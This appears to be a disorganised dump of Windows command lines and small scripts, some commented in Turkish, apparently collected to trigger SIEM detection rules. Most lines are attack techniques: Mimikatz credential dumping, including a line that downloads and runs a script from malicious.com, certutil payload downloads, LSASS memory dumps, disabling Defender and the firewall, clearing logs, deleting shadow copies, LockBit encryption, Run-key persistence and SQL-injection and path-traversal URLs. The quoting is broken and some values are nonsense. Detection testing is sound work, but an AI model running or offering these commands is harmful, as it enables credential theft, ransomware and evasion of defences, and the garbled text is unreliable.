Import-Module GroupPolicy
New-GPO -Name "TestGPO" -Domain "yourdomain.com"
Set-GPLink -Name "TestGPO" -Target "DC=yourdomain,DC=com" -LinkEnabled Yes
Remove-GPO -Name "TestGPO" -Domain "yourdomain.com"


secedit /export /cfg C:\Temp\secpol.cfg
echo "[Group Policy]">>C:\Temp\secpol.cfg
echo "Test modification">>C:\Temp\secpol.cfg
secedit /configure /db C:\Temp\secedit.sdb /cfg C:\Temp\secpol.cfg
del C:\Temp\secpol.cfg


$path = "C:\Windows\System32\drivers\etc\hosts"
$content = Get-Content $path
$content += "127.0.0.1 test.local"
Set-Content -Path $path -Value $content


shutdown /s /t 0


New-ADUser -Name "TestUser" -GivenName "Test" -Surname "User" -SamAccountName "TestUser" -UserPrincipalName "TestUser@yourdomain.com" -Path "CN=Users,DC=yourdomain,DC=com" -Enabled $true -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -ChangePasswordAtLogon $false
Enable-ADAccount -Identity "TestUser"


Disable-ADAccount -Identity "TestUser"


Remove-ADUser -Identity "TestUser" -Confirm:$false


New-ADGroup -Name "TestGroup" -GroupScope Global -Path "CN=Users,DC=yourdomain,DC=com"


Remove-ADGroup -Identity "TestGroup" -Confirm:$false


Add-ADGroupMember -Identity "TestGroup" -Members "TestUser"


Remove-ADGroupMember -Identity "TestGroup" -Members "TestUser" -Confirm:$false


net user TestUser Password123! /add


net user TestUser /active:no


net user TestUser /delete


net localgroup TestGroup /add


net localgroup TestGroup /delete


net localgroup Administrators TestUser /add


net localgroup Administrators TestUser /delete


runas /user:Administrator cmd.exe


net use \\localhost\IPC$ /user:Administrator wrongpassword


wevtutil cl Security
wevtutil cl System


echo "Malware detected" | Out-File -FilePath C:\Windows\Temp\malware.log


net user DormantUser Password123! /add
runas /user:DormantUser cmd.exe
net user DormantUser /delete


net user TestUser /lock


for ($i=0; $i -lt 10; $i++) { net use \\localhost\IPC$ /user:Administrator wrongpassword }


net user ServiceAccount Password123! /add
runas /user:ServiceAccount cmd.exe
net user ServiceAccount /delete


Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1


reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableSecureUIAPaths /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f


Start-Process mshta.exe


for ($i=1; $i -le 21; $i++) { net user TestUser$i /active:no }


for ($i=1; $i -le 21; $i++) { net user TestUser$i /delete }


net user TestUser Password123! /add
net user TestUser /delete


Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\TestService" -Name "Start" -Value 4


schtasks /create /tn "TestTask" /tr "notepad.exe" /sc once /st 00:00


certutil.exe -urlcache -split -f http://malicious.com/payload


for ($i=0; $i -lt 5; $i++) { net use \\localhost\IPC$ /user:Administrator wrongpassword }


Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:yourdomain /ntlm:aad3b435b51404eeaad3b435b51404ee"'


net user TestUser /passwordreq:no


Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosSecurityToken


wevtutil cl Application


vssadmin delete shadows /all /quiet


net user TestUser /expires:never


whoami /priv


wmic useraccount get name,sid


net user administrator


net localgroup administrators


net share


netsh advfirewall show allprofiles


netsh advfirewall set allprofiles state off


netsh advfirewall set allprofiles state off


findstr /si password *.txt


certutil.exe -urlcache -split -f http://malicious.com/payload


certutil.exe -verifyctl -split -f http://malicious.com/payload


certutil.exe -exportPFX -split -f http://malicious.com/payload


certutil.exe -decode http://malicious.com/payload decoded_payload


sc config WinDefend start= disabled


start zenmap.exe


procdump.exe -ma lsass.exe lsass.dmp


attrib +h C:\Temp\hiddenfile.txt


hashcat.exe -a 0 -m 1000 hashes.txt wordlist.txt


outflank-dumpert.exe


nltest /domain_trusts /all_trusts


xordump.exe


cscript.exe wmiexec.vbs


netsh advfirewall reset


start CleanWipe.exe


ssh -L 3389:localhost:3389 user@remotehost


ssh -R 1234:localhost:3389 user@remotehost


start svchost.exe winword.exe


certutil -decodehex input.hex output.bin


rundll32.exe shell32.dll,Control_RunDLL


start winword.exe /m malicious_macro


start responder.exe -I eth0 -wrf


mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"


powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"


whoami /user /sid


start cmd.exe /c "echo 'Web shell executed' > C:\inetpub\wwwroot\webshell.aspx"


start csrss.exe


Invoke-Kerberoast -Verbose


systeminfo


tasklist


netstat -an


whoami


klist purge
kinit -k -t user.keytab user@REALM.COM


Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels" -Name "Enabled" -Value "0"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall" -Name "EnableFirewall" -Value "0"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value "0"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value "1"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value "1"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value "0"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "GroupPolicyRefreshTime" -Value "0"


wbadmin DELETE SYSTEMSTATEBACKUP


Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value "C:\ProgramData\LockBit\wallpaper.bmp"


lockbit.exe -safe -path C:\Path\To\Encrypt

"# Honeypot IP adreslerini belirleyin
$honeypotIPs = @(""192.168.1.100"", ""192.168.1.101"", ""192.168.1.102"")

foreach ($ip in $honeypotIPs) {
    Test-NetConnection -ComputerName $ip -Port 80
}
@echo off
set urls=(
    ""http://your-iis-server.com/vulnerable_page.php?id=1' OR '1'='1""
    ""http://your-iis-server.com/vulnerable_page.php?id=1; DROP TABLE users""
    ""http://your-iis-server.com/vulnerable_page.php?id=1' UNION SELECT null, username, password FROM users --""
)

for %%u in %urls% do (
    curl %%u
)
# Hedef IP adresi veya mail sunucusu adresi
$destination = ""smtp.example.com""
$port = 25

# SMTP bağlantısı denemesi
Send-MailMessage -To ""recipient@example.com"" -From ""sender@example.com"" -Subject ""Test"" -Body ""This is a test message."" -SmtpServer $destination -Port $port
# Bir torrent dosyasını indirir ve P2P trafiği oluşturur.
transmission-cli https://example.com/sample.torrent
# Bir torrent dosyasını indirir ve P2P trafiği oluşturur.
aria2c https://example.com/sample.torrent
destination=""http://your-web-server.com""
requests=250

for i in $(seq 1 $requests); do
    wget -qO- $destination
done
bash komutuhping3 -S -p 81 -c 1000 192.168.1.100
veya@echo off
set destination=192.168.1.100
set port=81
set requests=1000

for /L %%i in (1,1,%requests%) do (
    telnet %destination% %port%
)
@echo off
:: Hedef IP adresi veya iç ağa ait bir sunucunun IP adresi
set destination=192.168.1.100

:: Ping komutu ile test bağlantısı
ping %destination%

:: Telnet komutu ile belirli bir porta bağlantı denemesi (Örneğin, 80 numaralı port)
telnet %destination% 80
"





"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableLUA /t REG_DWORD /d 1 /f
reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableLUA /t REG_DWORD /d 1 /f
"
#AD?


"reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\SomeService"" /v Start /t REG_DWORD /d 2 /f
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v SomeApp /t REG_SZ /d ""C:\Path\To\AnotherApp.exe"" /f
reg add ""HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"" /v SomeProgram /t REG_SZ /d ""C:\Path\To\Program.exe"" /f
certutil.exe -urlcache -split -f http://malicious-url.com/file.txt
dsacls.exe /user <username> /passwd <password>
# Generate NTLM hash of a password (replace ""Password123"" with an actual password)
$Password = ""Password123""
$Hash = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Password))
Write-Output ""NTLM Hash: $Hash""

# Simulate accessing a resource using the NTLM hash (replace with an actual target)
$Target = ""\\Server\Share""
cmd.exe /c net use $Target /user:$Username $Hash
findstr /S /I /M ""cpassword \sysvol\ .xml"" C:\Windows\System32\config
# Simulate access to LSASS object with specific permissions (hypothetical example)
echo Simulating LSASS access with specific permissions...
tscon.exe /dest:rdp-tcp
curl ""http://your-iis-server.com/vulnerable_path.php?file=/etc/passwd""
curl ""http://your-iis-server.com/vulnerable_path.php?file=/root/.bash_history""
curl ""http://your-iis-server.com/vulnerable_path.php?file=/var/mail/root""  
:: wevtutil.exe kullanarak günlük temizleme işlemi örneği
wevtutil.exe cl Security 
:: vssadmin.exe kullanarak gölge kopya silme işlemi örneği
vssadmin.exe delete shadows /all /quiet
# Simulating setting a user account password to never expire
New-LocalUser -Name ""TestUser"" -PasswordNeverExpires $true
# Simulating a DNS tunneling attempt with Excel as the parent process
Start-Process -FilePath ""cmd.exe"" -ArgumentList ""/c echo 'DNS tunneling attempt via Dataexchange.dll' > C:\Logs\DNS_Tunnel.log"" -NoNewWindow -Wait -PassThru
:: whoami komutu ile ayrıcalıkların sorgulanması örneği
whoami /priv
:: net.exe kullanarak kullanıcı bilgilerinin sorgulanması örneği
net user
# whoami.exe kullanarak tüm kullanıcı gruplarına ait bilgilerin sorgulanması örneği
Start-Process -FilePath ""whoami.exe"" -ArgumentList ""/all"" -NoNewWindow -Wait
:: WMIC.exe kullanarak SID keşfi veya hesap bilgileri sorgulama örneği
wmic.exe useraccount list brief
:: net.exe kullanarak yönetici gruplarının sorgulanması örneği
net localgroup administrators
:: ROUTE.exe kullanarak ağ bilgilerinin sorgulanması örneği
ROUTE.exe print
:: arp -a komutu ile ARP tablosunun keşfedilmesi örneği
arp -a
:: net.exe kullanarak ağ paylaşımlarının sorgulanması örneği
net share
:: netsh.exe kullanarak güvenlik duvarı yapılandırmasının sorgulanması örneği
netsh firewall show config
:: netsh.exe kullanarak güvenlik duvarını devre dışı bırakma örneği
netsh firewall set opmode disable
:: netsh.exe kullanarak Advfirewall üzerinden güvenlik duvarını devre dışı bırakma örneği
netsh advfirewall set allprofiles state off
# PowerShell script to trigger the SIEM rule by using findstr.exe with specified parameters

# Define the file to search within (create a temporary file with some content)
$tempFilePath = ""$env:TEMP\tempfile.txt""
Set-Content -Path $tempFilePath -Value ""This is a test file containing the word password.""

# Define the findstr.exe command with parameters and keywords
$findstrCommand = 'findstr.exe /i /n ""password""'

# Execute the findstr.exe command
Start-Process -FilePath ""findstr.exe"" -ArgumentList ""/i"", ""/n"", ""password"", $tempFilePath -NoNewWindow -Wait

# Clean up temporary file
Remove-Item -Path $tempFilePath -Force
:: certutil.exe with URLCache and Split arguments example
certutil /urlcache /f /split
:: Define the URL to download the file from
set URL=http://example.com/samplefile.txt
:: Define the path to save the downloaded file
set DOWNLOAD_PATH=%TEMP%\samplefile.txt

:: Use certutil to download the file with the specified arguments
certutil.exe -urlcache -split -f %URL% %DOWNLOAD_PATH%

:: VerifyCtl argument usage
certutil.exe -verifyctl %DOWNLOAD_PATH%
# Create a self-signed certificate
$cert = New-SelfSignedCertificate -DnsName ""localhost"" -CertStoreLocation ""Cert:\LocalMachine\My""

# Get the thumbprint of the created certificate
$certThumbprint = $cert.Thumbprint

# Define the output file for the exported certificate
$outputFile = ""$env:TEMP\exportedcert.pfx""

# Use certutil to export the certificate
Start-Process -FilePath ""certutil.exe"" -ArgumentList ""-exportpfx My $certThumbprint $outputFile"" -NoNewWindow -Wait
# Define the input and output file paths
$inputFile = ""$env:TEMP\encodedfile.txt""
$outputFile = ""$env:TEMP\decodedfile.txt""

# Create an example encoded file (Base64 encoding for demonstration purposes)
$originalContent = ""This is a test file.""
[System.IO.File]::WriteAllText($inputFile, [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($originalContent)))

# Use certutil to decode the file
Start-Process -FilePath ""certutil.exe"" -ArgumentList ""-decode $inputFile $outputFile"" -NoNewWindow -Wait

# Display the decoded content
$decodedContent = Get-Content -Path $outputFile
Write-Output ""Decoded Content: $decodedContent"
":: Zenmap tarama komutu örneği
set SCAN_COMMAND=-p 80,443 scanme.nmap.org

:: Zenmap'ı çalıştırma
""C:\Program Files (x86)\Nmap\zenmap.exe"" %SCAN_COMMAND%
procdump.exe -accepteula -ma notepad.exe %TEMP%\notepad.dmp
:: Dosya yolu tanımla (örnek dosya)
set FILE_TO_HIDE=C:\Path\To\Your\File.txt

:: attrib.exe kullanarak dosyayı gizle
attrib.exe +h %FILE_TO_HIDE%
:: hashcat komutunu tanımla (örnek komut)
set HASHCAT_COMMAND=-m 1000 -a 0 hashfile.txt rockyou.txt

:: hashcat.exe kullanarak şifre kırma işlemi
hashcat.exe %HASHCAT_COMMAND%
:: outflank-dumpert komutunu çalıştırma
outflank-dumpert.exe
:: nltest komutunu çalıştırma
nltest.exe /domain_trusts
:: Define the output dump file path
set OUTPUT_DUMP_FILE=%TEMP%\processdump.bin

:: xordump.exe kullanarak işlem belleği dökümü
xordump.exe -o %OUTPUT_DUMP_FILE%
:: VBS script dosyasının yolunu tanımla
set VBS_SCRIPT=C:\Path\To\Your\WMIExec.vbs

:: cscript.exe kullanarak VBS script'i çalıştırma
cscript.exe %VBS_SCRIPT% /shell
# Windows Güvenlik Duvarı ayarlarını varsayılan değerlere geri yükleme
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -DefaultOutboundAction Allow
:: CleanWipe veya CATClean.exe işlemini çalıştırma örneği
CleanWipe.exe
# conhost.exe ile birlikte Path Traversal örneği (simülasyon)
Start-Process -FilePath ""conhost.exe"" -ArgumentList ""/../../../Windows/system32/cmd.exe /k dir C:\"
"# Simulating suspicious SSH usage with SSH and RDP tunneling indicators
Start-Process -FilePath ""ssh.exe"" -ArgumentList ""-L 3389:localhost:3389"" -NoNewWindow -Wait
:: ssh.exe kullanarak şüpheli port yönlendirme işlemi örneği
ssh.exe -L 8080:127.0.0.1:80 remote-server
# Simulating svchost.exe spawning an Office application (Excel)
Start-Process -FilePath ""excel.exe"" -ArgumentList ""/c"" -NoNewWindow -PassThru | ForEach-Object { $_.ParentProcessId = (Get-Process svchost).Id }
# Simulating suspicious certutil command usage
Start-Process -FilePath ""certutil.exe"" -ArgumentList ""-decode testfile.txt decodedfile.bin"" -NoNewWindow -Wait
Start-Process rundll32.exe -ArgumentList ""C:\Windows\System32\drivers\example.sys,EntryPoint"
"# Example PowerShell command to simulate the detection trigger:
Start-Process ""winword.exe"" ""malicious.docm"
"# Example PowerShell command to simulate the detection trigger:
Test-NetConnection -ComputerName localhost -Port 5355
# Example PowerShell command to simulate the detection trigger:
Get-WinEvent -LogName Security -FilterXPath ""*[System[EventID=4782]]"
"# Example PowerShell command to simulate the detection trigger:
Start-Process mimikatz.exe
# Example PowerShell command to simulate the detection trigger:
Start-Process powershell.exe ""-Command {Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'}"
"# Example PowerShell command to simulate the detection trigger:
Start-Process whoami.exe
# Example PowerShell command to simulate the detection trigger:
Start-Process cmd.exe
# Example PowerShell command to simulate the detection trigger:
Start-Process crss.exe
systeminfo
tasklist
netstat
qprocess.exe
whoami
arp -a
adfind -sc
netstat
ADRecon.ps1
net user
net user Guest /active:yes
adfind -f ""objectcategory=person"" or adfind -f ""objectcategory=user"
"get-process | where-object { $_.MainWindowsTitle }
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} -ErrorAction SilentlyContinue | Where-Object {$_.Properties[5].Value -like ""*krbtgt*"" -and $_.Properties[8].Value -notin 6 -and $_.Properties[1].Value -notin ""Guest""} | % { Write-Output ""Administrator Account Enumeration Detected via Net Command"" }
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4720,4722,4723,4725} -ErrorAction SilentlyContinue | Where-Object {$_.Properties[5].Value -eq ""admin""} | ForEach-Object { Write-Output ""Admin Account Manipulate detected"" }

wevtutil qe Security /q:""*[System[EventID=4657]]"" /f:text | findstr /C:""SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"" | findstr /C:""AutoAdminLogon"" /C:""DefaultUserName"" /C:""DefaultDomainName"" /C:""DefaultPassword""

wevtutil qe Security /q:""*[System[EventID=4657]]"" /f:text | findstr /C:""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels"" | findstr /C:""Enabled"" /C:""ChannelAccess""

wevtutil qe Security /q:""*[System[EventID=4657]]"" /f:text | findstr /C:""SOFTWARE\\Policies\\Microsoft\\WindowsFirewall"" | findstr /C:""EnableFirewall""

wevtutil qe Security /q:""*[System[EventID=4657]]"" /f:text | findstr /C:""SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet"" | findstr /C:""SpynetReporting"" | findstr /C:""SubmitSamplesConsent""

wevtutil qe Security /q:""*[System[EventID=4657]]"" /f:text | findstr /C:""SOFTWARE\\Policies\\Microsoft\\Windows Defender"" | findstr /C:""DisableRoutinelyTakingAction"" | findstr /C:""DisableRealtimeMonitoring"" | findstr /C:""DisableBehaviorMonitoring""

wevtutil qe Security /q:""*[System[EventID=4657]]"" /f:text | findstr /C:""SOFTWARE\\Policies\\Microsoft\\Windows Defender"" | findstr /C:""DisableAntiSpyware""

Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4657} | Where-Object {
    $_.Properties[5].Value -match ""SOFTWARE\\Policies\\Microsoft\\Windows\\System"" -and
    $_.Properties[8].Value -match ""EnableSmartScreen|del\.ShellSmartScreenLevel""
}

Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4657} | Where-Object {
    $_.Properties[5].Value -match ""SOFTWARE\\Policies\\Microsoft\\Windows\\System"" -and
    $_.Properties[8].Value -match ""GroupPolicyRefreshTimeDC|GroupPolicyRefreshTimeOffsetDC|GroupPolicyRefreshTime|GroupPolicyRefreshTimeOffset""
}

wevtutil qe Security /q:""*[System[EventID=4688]]"" /f:text | findstr /C:""LB3.exe"" /C:""LB3Decryptor.exe"" /C:""LB3_pass.exe"" /C:""LB3_RelectiveDLL_DLLMain.dll"" /C:""LB3_Rundll32.dll"" /C:""LB3_Rundll32

Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4657} | Where-Object {
    $_.Properties[2].Value -like ""*Control Panel\Desktop\WallPaper*"" -and
    $_.Properties[4].Value -like ""*C:\ProgramData\*""
}

wevtutil qe Security /q:""*[System[EventID=4657]]"" /f:text | findstr /C:""Control Panel\Desktop\WallPaper"" /C:""C:\ProgramData\""

for /L %i in (1,1,65535) do (echo open 127.0.0.1 %i) | telnet | find /v \"Connect Failed\"
sqlcmd -Q \"SELECT * FROM <table_name> WHERE SIG_ID IN ('47-4000167','47-4000166') OR CUST_2 IN ('CommandID|6751494449278544611[.\\get-keystrokes.ps1,get-keystrokes.ps1]') AND CUST_4259873 CONTAINS 'Description|12622590293378144023[-LogPath,-logpath]' AND SIG_ID IN ('43-453041040','43-263046880') OR SIG_ID IN ('43-453041040','43-263046880') AND CUST_4259873 CONTAINS 'Description|12622590293378144023[get-keystrokes]' OR 'None';\"
copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\masqcmd.exe\nC:\\Windows\\System32\\masqcmd.exe /c echo Masquerading test
netstat -an | findstr \"3389\\|139\\|445\"
command_to_trigger_the_correlation
netstat -ano | findstr :80
powershell.exe -Command \"Start-Process 'powershell' -Verb runAs\"
echo \"test\" | clip # Replace with your command
tasklist\nget-process\nget-wmiobject -Query \"select * from win32_process\"
copy-item -Path C:\\Source\\file.txt -Destination \\\\RemotePC\\Dest\\\ncertutil -urlcache -split -f https://website.com/file.txt C:\\Dest\\file.txt\nbitsadmin /transfer myDownloadJob /download /priority normal http://website.com/file.jpg C:\\Dest\\file.jpg\npsexec.exe \\\\RemotePC -accepteula -u user -p password -c C:\\Source\\file.txt C:\\Dest\\\nwget http://website.com/file.jpg -OutFile C:\\Dest\\file.jpg\nscp user@remote:/source/file.txt /dest/
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /t REG_SZ /d calc.exe /f\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /t REG_SZ /d calc.exe /f\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /f\nreg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /f
Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Test' -Value 'calc.exe'\nSet-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Test' -Value 'calc.exe'\nRemove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Test'\nRemove-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Test'
netsh firewall\nget-nettcpconnection
nltest /dclist\narp -a\nnbtstat -a\nnet view\nnslookup\nipconfig
powershell -Command \"& {Invoke-WebRequest -Uri https://example.com -UserAgent 'Mozilla/5.0'}\"
echo \"This is a placeholder command that should be replaced with a real command.\"
echo 'Triggering DT0477 - Standard Cryptographic Protocol - T1032'
sc query\ntasklist.exe\nwmic\nnet start\nget-service
net localgroup\ngpresult /R\nnet group
whoami\nwmic useraccount\nquser\nqwinsta.exe\nget-wmiobject -Query \"Select * from Win32_UserAccount\"
echo off\necho [echo] > C:\\windows\\system32\\test.lnk\necho [internetshortcut] > C:\\windows\\system32\\test.lnk\necho [windows] > C:\\windows\\system32\\test.lnk\necho [system32] > C:\\windows\\system32\\test.lnk\necho [createshortcut] > %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.lnk\necho [appdata] > %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.lnk\necho [startup] > %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.lnk
echo '43-453041040' > C:\\temp\\SIG_ID.txt && echo 'Description|12622590293378144023[msbuild]' > C:\\temp\\CUST_4259873.txt
snippingtool /clip\ncopyfromscreen\ngetimage\npowershell -Command \"Add-Type -TypeDefinition '[DllImport(\\\"user32.dll\\\")]^public static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);' -Name a -Pas\npowershell -Command \"$a = Add-Type -memberDefinition '[DllImport(\\\"user32.dll\\\")]^public static extern IntPtr GetForegroundWindow();' -name a -passThru\"\npowershell -Command \"$a::GetForegroundWindow()\"
schtasks /create /tr \"C:\\\\Windows\\\\System32\\\\notepad.exe\" /tn \"TestTask\"\nat 12:00 /every:M,T,W,Th,F,S,Su \"C:\\\\Windows\\\\System32\\\\notepad.exe\"
powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value 'Bypass'\"\npowershell -Command \"Start-Process -FilePath 'notepad.exe' -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'USERNAME', (ConvertTo-SecureString -String 'PASSWORD' -AsPlainText -Force))\"\npowershell -Command \"Start-Job -ScriptBlock {Write-Output 'Hello, World!'}\"
Get-Process | Where-Object { $_.Name -match \"virus|carbonblack|defender|cylance\" }\nGet-WmiObject -Namespace \"root\\SecurityCenter2\" -Class \"AntivirusProduct\"
net.exe stop <service_name>
sc.exe start \"MyService\"
Start-Process -Name \"MyService\"
echo \"This is a placeholder command for SID-History Injection.\"
net accounts
echo aa.exe >> C:\\temp\\temp.txt\necho hvncinject >> C:\\temp\\temp.txt\necho vncinject >> C:\\temp\\temp.txt
net use \\\\target\\IPC$ /user:username password
systeminfo\nreg query HKLM\\System\\CurrentControlSet\\Services\\Disk\\Enum
$PSVersionTable\n[environment]::OSVersion.Version
netsh interface portproxy add v4tov4 listenport=6666 listenaddress=0.0.0.0 connectport=4444 connectaddress=127.0.0.1
echo \"This is a placeholder command\"
echo print(\"Hello, World!\") > script.py && python script.py
arp -a\nipconfig /all\nnbtstat -n\nnetsh interface show\nnet config
mimikatz \"kerberos::ptt C:\\path\\to\\ticket.kirbi\"
powershell.exe -encodedcommand \"SGVsbG8sIFdvcmxkIQ==\"
wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"TestEventFilter\", EventNameSpace=\"root\\\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"TestEventConsumer\", CommandLineTemplate=\"C:\\\\Windows\\\\System32\\\\notepad.exe\"\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"TestEventFilter\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"TestEventConsumer\\\"\"
cmd.exe /c net use \\\\target\\C$ /user:username password
New-PSDrive -Name \"X\" -PSProvider \"FileSystem\" -Root \"\\\\target\\C$\"
gwmi win32_bios
net user /add yasar\nnet localgroup \"Remote Desktop Users\" yasar /add
wmic useraccount get /all\nwmic process get\nwmic process call\nwmic qfe get\nwmic /node:\"localhost\" service where\nwmic /node:\"localhost\" process call create
powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com\"
echo malicious_code > malicious.txt && start excel.exe /r malicious.txt
echo 'malicious_code' | Out-File 'malicious.txt'; Start-Process -FilePath \"excel.exe\" -ArgumentList \"/r malicious.txt\"
New-Service -Name \"TestService\" -BinaryFilePathName \"C:\\Windows\\System32\\notepad.exe\"
sc create testService binpath= C:\\\\Program Files\\\\Test Folder\\\\test.exe
del C:\\path\\to\\infected\\file.txt
# Your command here
FOR /L %i IN (80,443) DO (echo open 127.0.0.1 %i >_temp & echo user anonymous >>_temp & echo GET / >>_temp & echo quit >>_temp & ftp -n -s:_temp & del _temp)
net user\nnet localgroup\ncmdkey /list
Get-LocalUser\nGet-LocalGroup\nGet-ADUser
rundll32.exe
powershell get-process\npowershell kill\ntasklist\ncmd /C \"\"c:\\simsistem\\copy-to-ifs10.cmd\"\"
REG QUERY HKLM /s\nREG QUERY HKCU /s
gpupdate /force
gpedit.msc
reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"C:\\path\\to\\wallpaper.bmp\" /f
echo LB3.exe\necho LB3_pass.exe\necho LB3_RelectiveDLL_DLLMain.dll\necho LB3_Rundll32.dll\necho LB3_Rundll32_pass.dll\necho LB3Decryptor.exe\necho Password_dll.txt\necho shadowcopy\necho SYSTEMSTATEBACKUP\necho VMwareXferlogs.exe\nwbadmin start backup\nwevtutil cl\nwevtutil cl system
Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name \"GroupPolicyRefreshTime\" -Value 10814778825021535730
echo gdel gspd pass psex wall > CUST_4259873
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d \"C:\\Windows\\System32\\evil.exe\"
reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f
REG ADD \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Destination_Filename /t REG_SZ /d \"10814778825021535730[Windows Defender]\"
reg add HKCU\\Software\\Spynet /v Destination_Filename /t REG_BINARY /d 10814778825021535730 /f
REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile /v EnableFirewall /t REG_DWORD /d 0 /f
reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f
net user Administrator NewPassword123!
Get-Process | Where-Object {$_.MainWindowTitle}
adfind -f objectcategory=person objectcategory=user
net user guest /active:yes
net user\nnet group
netstat
arp -a
klist add krbtgt/yourdomain.com@YOURDOMAIN.COM
whoami
qprocess.exe
netstat
systeminfo
start C:\\Windows\\System32\\smss.exe\nstart C:\\Windows\\System32\\csrss.exe
start cmd /k apache.exe\nstart cmd /k powershell.exe
Start-Process -NoNewWindow -FilePath \"apache.exe\"\nStart-Process -NoNewWindow -FilePath \"powershell.exe\"
powershell.exe -dumpcr, dumpce, kerberos, lsadump, privilege::, sekurlsa, sekurlsa::
mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit
